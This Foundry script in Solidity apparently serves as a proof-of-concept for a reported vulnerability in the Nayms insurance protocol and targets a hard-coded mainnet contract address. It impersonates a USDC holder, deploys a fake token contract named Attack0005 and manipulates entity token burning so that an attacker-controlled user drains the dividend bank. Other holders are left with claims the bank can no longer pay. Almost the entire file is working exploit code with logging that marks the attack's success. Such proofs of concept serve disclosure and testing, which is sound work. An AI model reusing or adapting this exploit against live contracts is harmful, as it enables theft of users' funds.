// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { Script } from "forge-std/Script.sol";
import { StdStyle } from "forge-std/StdStyle.sol";
import { console2 as c } from "forge-std/console2.sol";

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { Entity, SimplePolicy, Stakeholders } from "src/diamonds/nayms/interfaces/FreeStructs.sol";
import { INayms } from "src/diamonds/nayms/INayms.sol";
import { LibConstants as LC } from "src/diamonds/nayms/libs/LibConstants.sol";
import { LibHelpers } from "src/diamonds/nayms/libs/LibHelpers.sol";

address constant USDC_ADDRESS = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant USDC_WHALE = 0xDa9CE944a37d218c3302F6B82a094844C6ECEb17;

contract IM_24511 is Script {
    using LibHelpers for *;
    using StdStyle for *;

    IERC20 public usdc = IERC20(USDC_ADDRESS);
    INayms public n = INayms(0x39e2f550fef9ee15b459d16bD4B243b04b1f60e5);

    address sa = 0xE6aD24478bf7E1C0db07f7063A4019C83b1e5929;
    bytes32 public USDC_ID = LibHelpers._getIdForAddress(USDC_ADDRESS);

    function fundEntityUsdc(address to, uint256 amount) private {
        vm.startPrank(USDC_WHALE);
        usdc.transfer(to, amount);
        vm.startPrank(to);
        usdc.approve(address(n), amount);
        n.externalDeposit(USDC_ADDRESS, amount);
        c.log(string.concat("funded ".green(), vm.getLabel(to).cyan().underline(), "'s parent with ", "%s".bold(), " usdc".green()), amount);
    }

    Entity entity = Entity({ assetId: USDC_ID, collateralRatio: LC.BP_FACTOR, maxCapacity: 100 ether, utilizedCapacity: 0, simplePolicyEnabled: true });

    function run() public {
        c.log(" ~~ create attack contract ~~".blue());

        address user1 = makeAddr("user 1");
        address user2 = makeAddr("user 2");
        address attackEntity = address(new Attack0005());
        address user3 = makeAddr("user 3");

        bytes32 user1Id = user1._getIdForAddress();
        bytes32 user2Id = user2._getIdForAddress();
        bytes32 attackEntityId = attackEntity._getIdForAddress();
        bytes32 user3Id = user3._getIdForAddress();

        // user1's parent is user1
        // user2's parent is attack contract
        c.log(" ~~ create entities ~~".blue());
        vm.startPrank(sa);
        n.createEntity(user1Id, user1Id, entity, "user1 entity"); // note parent is the same as the user
        n.createEntity(attackEntityId, user2Id, entity, "user2 entity");

        n.enableEntityTokenization(user1Id, "test_symbol", "test_name");
        n.enableEntityTokenization(attackEntityId, "test_symbol", "test_name");

        c.log(" ~~ fund entities ~~".blue());
        fundEntityUsdc(user1, 1000000 * 1e6);
        fundEntityUsdc(user1, 1000000 * 1e6); // 1st payDividend
        fundEntityUsdc(user2, 1000000 * 1e6);
        fundEntityUsdc(user2, 1000000 * 1e6); // 2nd payDividend
        fundEntityUsdc(user2, 1000000 * 1e6); // 3rd payDividend

        c.log(" ~~ user1Id ptoken setup ~~".blue());
        vm.startPrank(sa);
        n.startTokenSale(user1Id, 1e6, 1e6);

        vm.startPrank(user1);
        n.executeLimitOffer(USDC_ID, 1e6, user1Id, 1e6);

        c.log(" user1 has %s user1Id ptoken", n.internalBalanceOf(user1Id, user1Id));

        n.payDividendFromEntity(0x0000000000000000000000000000000000000000000000000000000000000011, 1000000 * 1e6);
        c.log("bank's internal USDC balance: %s", n.internalBalanceOf(LC.DIVIDEND_BANK_IDENTIFIER._stringToBytes32(), USDC_ID));
        c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));

        c.log(" ~~ attackEntityId ptoken setup ~~".blue());
        vm.startPrank(sa);
        n.startTokenSale(attackEntityId, 1e6, 1e6);

        vm.startPrank(user2);
        n.executeLimitOffer(USDC_ID, 1e6, attackEntityId, 1e6); // note user3 cannot directly purchase the par tokens because user3 doesn't have an existing parent
        n.internalTransferFromEntity(user3Id, attackEntityId, 1e6);

        c.log(" user3 has %s attackEntityId ptoken", n.internalBalanceOf(user3Id, attackEntityId));

        n.payDividendFromEntity(0x0000000000000000000000000000000000000000000000000000000000000022, 1000000 * 1e6);
        c.log("bank's internal USDC balance: %s", n.internalBalanceOf(LC.DIVIDEND_BANK_IDENTIFIER._stringToBytes32(), USDC_ID));
        c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));
        c.log("user3 can withdraw: %s dividends", n.getWithdrawableDividend(user3Id, attackEntityId, USDC_ID));

        c.log("!!!!!!!!!! attack start !!!!!!!!!!");

        vm.startPrank(sa);
        n.startTokenSale(attackEntityId, 1e6, 1e6);

        vm.startPrank(user2);
        n.executeLimitOffer(USDC_ID, 1e6, attackEntityId, 1e6);

        c.log(">>>>> attack entity admin burn some entity tokens ...");
        n.externalWithdrawFromEntity(attackEntityId, user2, attackEntity, 1e6);
        c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));
        c.log("user3 can withdraw: %s dividends", n.getWithdrawableDividend(user3Id, attackEntityId, USDC_ID));

        c.log("user2 parent's internal USDC balance: %s", n.internalBalanceOf(n.getEntity(user2Id), USDC_ID));

        vm.startPrank(user3);
        n.withdrawDividend(user3Id, attackEntityId, USDC_ID);
        // note user1 has withdrawable dividends, but the dividend bank has been drained by the attack
        c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));
        c.log("user3 can withdraw: %s dividends", n.getWithdrawableDividend(user3Id, attackEntityId, USDC_ID));
        c.log("bank's internal USDC balance: %s", n.internalBalanceOf(LC.DIVIDEND_BANK_IDENTIFIER._stringToBytes32(), USDC_ID));

        c.log("!!!!!!!!!! attack success !!!!!!!!!!");
        c.log("user3's internal USDC balance: %s", n.internalBalanceOf(user3Id, USDC_ID));
    }
}

contract Attack0005 {
    function myAddress() external view returns (address) {
        return address(this);
    }

    function decimals() external pure returns (uint256) {
        return 18;
    }

    function transfer(address to, uint256 value) public pure returns (bool) {
        return true;
    }
}
